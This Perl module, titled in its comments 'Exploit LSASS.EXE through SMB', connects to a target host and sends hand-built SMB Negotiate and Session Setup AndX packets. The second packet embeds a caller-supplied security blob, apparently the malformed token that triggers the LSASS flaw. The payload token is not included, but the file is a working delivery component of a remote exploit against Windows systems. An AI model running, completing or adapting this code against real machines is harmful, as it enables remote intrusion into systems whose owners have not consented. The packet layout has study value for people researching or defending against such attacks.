package SMB;

use strict;

use IO::Socket;

sub smb
{
	my $msg = shift;

	return pack("N", length($msg)) . $msg;
}

#
# Exploit LSASS.EXE through SMB
#

sub exploit
{
	my $host = shift;
	my $port = shift;
	my $token = shift;

	if (!$host || !$port || !$token) {
		die "Invalid parameters in SMB::exploit\n";
	}

	my $sock = new IO::Socket::INET (PeerAddr => $host,
	                                 PeerPort => $port,
	                                 Proto => 'tcp')
		or die "Could not connect to $host:$port : $!\n";
	
	my $pid = rand(0xffff);
	
	my $negotiate_req =
		# SMB Message Header

		"\xff\x53\x4d\x42".		# protocol id
		"\x72".					# command (NEGOTIATE_MESSAGE)
		"\x00\x00\x00\x00".		# status
		"\x18".					# flags (pathnames are case-insensitive)
		"\x53\xC8".				# flags2 (support Unicode, NT error codes, long
								# filenames, extended security negotiation and
								# extended attributes)
		"\x00\x00".				# Process ID high word
		"\x00\x00\x00\x00".		# signature
		"\x00\x00\x00\x00".
		"\x00\x00".				# reserved
		"\x00\x00".				# Tree ID
		pack("v", $pid).		# Process ID
		"\x00\x00".				# User ID
		"\x00\x00".				# Multiplex ID

		# SMB Message Parameters
		
		"\x00".					# word count
		
		# SMB Message Data
		"\x62\x00".				# byte count
		
		"\x02\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50\x52\x4F\x47".
		"\x52\x41\x4D\x20\x31\x2E\x30\x00". # PC NETWORK PROGRAM 1.0

		"\x02\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00". # LANMAN1.0
		
		"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72".
		"\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00". # WfW 3.1a
		
		"\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30\x32\x00". # LM1.2X002
		
		"\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00". # LANMAN2.1

		"\x02\x4E\x54\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00"; # NT LM 0.12
	
	print "  Sending Negotiate Protocol Request\n";
	print $sock smb($negotiate_req);

	my $session_setup_req =

		# SMB Message Header

		"\xff\x53\x4d\x42".		# protocol id
		"\x73".					# command (Session Setup AndX)
		"\x00\x00\x00\x00".		# status
		"\x18".					# flags (pathnames are case-insensitive)
		"\x07\xC8".				# flags2 (support Unicode, NT error codes, long
								# filenames, extended security negotiation and
								# extended attributes and security signatures)
		"\x00\x00".				# Process ID high word
		"\x00\x00\x00\x00".		# signature
		"\x00\x00\x00\x00".
		"\x00\x00".				# reserved
		"\x00\x00".				# Tree ID
		pack("v", $pid).		# Process ID
		"\x00\x00".				# User ID
		"\x00\x00".				# Multiplex ID

		# SMB Message Parameters
		
		"\x0c".					# word count (12 words)

		"\xff".					# AndXCommand: No further commands
		"\x00".					# reserved

		"\x00\x00".				# AndXOffset
		"\x04\x11".				# max buffer: 4356
		"\x0a\x00".				# max mpx count: 10
		
		"\x00\x00".				# VC number
		"\x00\x00\x00\00".		# session key
		
		pack("v", length($token)).	# security blob length
		"\x00\x00\x00\x00".		# reserved
		
		"\xd4\x00\x00\x80".		# capabilities

		# SMB Message Data

		pack("v", length($token)+0).	# byte count (+72)
	
		$token.					# security blob
		
		"\x00\x00\x00\x00\x00\x00";
		
#		"\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00".
#		"\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00".
#		"\x31\x00\x39\x00\x35\x00\x00\x00". # Windows 2000 2195
#
#		"\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00".
#		"\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00".
#		"\x2e\x00\x30\x00\x00\x00". # Windows 2000 5.0
#
#		"\x00\x00";				# primary domain

	sleep(1);

	print "  Sending Session Setup AndX request (" . length($session_setup_req) . ") bytes\n";
	print $sock smb($session_setup_req);

	sleep(1);

	close($sock);
	
	return 1;
}

1;
